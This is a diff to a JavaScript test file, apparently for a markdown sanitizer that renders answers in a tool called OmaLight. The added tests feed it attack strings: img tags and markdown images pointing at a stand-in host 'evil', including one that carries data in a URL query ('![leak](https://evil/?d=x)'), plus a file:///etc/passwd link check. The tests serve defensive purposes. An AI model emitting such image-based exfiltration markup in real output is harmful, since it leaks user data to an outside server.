@@ -77,11 +77,18 @@ for (const attack of [
   "[a\\](https://x) <&#105;mg src='http://evil/'/> [b](https://z)",
   "\\<*img src='http://evil/'*/>",
   "<`img src='http://evil/'`/>",
+  // Autolinks next to "!" or a link: the "![" they form is still broken up.
+  "!<https://evil/x.png>",
+  "x!<https://e/a>[y](https://e/b)",
+  "![a](<https://evil/x.png>)",
 ]) assert.ok(!unsafe(S.safeMarkdown(attack)), "unsafe after safeMarkdown: " + attack)
 assert.strictEqual(S.safeMarkdown("a ![leak](https://evil/?d=x) b"), "a !" + WJ + "[leak](https://evil/?d=x) b")
 assert.strictEqual(S.safeMarkdown("run `omarchy theme set <name>` or <name>"), "run `omarchy theme set <" + WJ + "name>` or <" + WJ + "name>")
 assert.strictEqual(S.safeMarkdown("a < b and 2<3"), "a <" + WJ + " b and 2<" + WJ + "3")
 assert.strictEqual(S.safeMarkdown("see <https://wiki.hypr.land/x>"), "see [https://wiki.hypr.land/x](https://wiki.hypr.land/x)")
+assert.strictEqual(S.safeMarkdown("<https://a/b)c>"), "[https://a/b)c](https://a/b%29c)")
+assert.strictEqual(S.safeMarkdown("<https://a/[x]>"), "[https://a/\\[x\\]](https://a/%5Bx%5D)")
+assert.strictEqual(S.safeMarkdown("[a](<https://x/y>)"), "[a](https://x/y)")
 assert.strictEqual(S.colorLinks, undefined, "no HTML of OmaLight's own goes into answers")
 assert.strictEqual(S.isWebLink("https://wiki.archlinux.org/x"), true)
 assert.strictEqual(S.isWebLink("file:///etc/passwd"), false)
